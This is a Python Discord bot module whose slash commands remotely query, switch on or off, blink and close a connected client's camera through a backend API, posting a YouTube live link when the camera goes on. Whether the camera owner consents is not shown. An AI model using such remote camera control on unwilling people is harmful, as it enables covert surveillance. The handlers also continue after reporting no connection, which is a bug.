import asyncio
import logging

from discord import Embed, Option
from discord.commands import ApplicationContext, slash_command
from discord.ext import commands

from bot.bot import Bot
from bot.core import constants, settings

log = logging.getLogger(__name__)

not_connected_embed = Embed(
    colour=constants.colours.red,
    description=":x: Not connected to any session, run **/connect** first."
)


class Camera(commands.Cog):
    """Commands that interact with the camera."""

    def __init__(self, bot: Bot):
        self.bot = bot

    @slash_command(guild_ids=settings.guild_ids)
    async def status(self, ctx: ApplicationContext) -> None:
        """Show the status of the client's camera."""
        client = self.bot.connected_client
        if client is None:
            await ctx.respond(embed=not_connected_embed)

        url = f"{settings.api_url}/clients/{client.host}/{client.port}/camera"
        async with self.bot.http_session.get(url) as resp:
            camera = await resp.json()
            embed = Embed(
                colour=constants.colours.red if camera["on"] else constants.colours.bright_green,
                description=f"• Turned on: **{camera['on']}**"
            )
            await ctx.respond(embed=embed)

    @slash_command(guild_ids=settings.guild_ids)
    async def toggle(self, ctx: ApplicationContext) -> None:
        """Toggle the client's camera."""
        client = self.bot.connected_client
        if client is None:
            await ctx.respond(embed=not_connected_embed)

        url = f"{settings.api_url}/clients/{client.host}/{client.port}/camera/toggle"
        async with self.bot.http_session.post(url) as resp:
            if resp.ok:
                await ctx.respond(":thumbsup:")

    @slash_command(guild_ids=settings.guild_ids)
    async def turn(self, ctx: ApplicationContext,
                   state: Option(str, description="on/off", choices=["on", "off"])) -> None:
        """Turn the client's camera on or off."""
        client = self.bot.connected_client
        if client is None:
            await ctx.respond(embed=not_connected_embed)

        url = f"{settings.api_url}/clients/{client.host}/{client.port}/camera/switch"
        params = {"on": str(state == "on")}
        async with self.bot.http_session.post(url, params=params) as resp:
            if resp.ok:
                embed = Embed(
                    colour=constants.colours.bright_green,
                    description=f"Camera turned {state} successfully :movie_camera:"
                )
                await ctx.respond(embed=embed)

        if state == "on":
            await asyncio.sleep(10)
            await ctx.respond(content=f"https://www.youtube.com/channel/{settings.channel_id}/live")

    @slash_command(guild_ids=settings.guild_ids)
    async def blink(self, ctx: ApplicationContext,
                    repeat: Option(int, description="Number of times the camera should blink."),
                    delay: Option(int, description="Interval between each blink.")) -> None:
        """Blink the client's camera light."""
        client = self.bot.connected_client
        if client is None:
            await ctx.respond(embed=not_connected_embed)

        url = f"{settings.api_url}/clients/{client.host}/{client.port}/camera/blink"
        params = {"repeat": repeat, "delay": delay}
        async with self.bot.http_session.post(url, params=params) as resp:
            if resp.ok:
                await ctx.respond(":thumbsup:")

    @slash_command(guild_ids=settings.dev_guild_ids)
    async def close(self, ctx: ApplicationContext) -> None:
        """Close the current session (you won't be able to connect again)."""
        client = self.bot.connected_client
        if client is None:
            await ctx.respond(embed=not_connected_embed)

        url = f"{settings.api_url}/clients/{client.host}/{client.port}"
        async with self.bot.http_session.delete(url) as resp:
            if resp.ok:
                embed = Embed(
                    colour=constants.colours.bright_green,
                    description=f"Successfully closed **`{client.host}:{client.port}`** session."
                )
                await ctx.respond(embed=embed)


def setup(bot: Bot) -> None:
    """Loads the Camera cog."""
    bot.add_cog(Camera(bot))
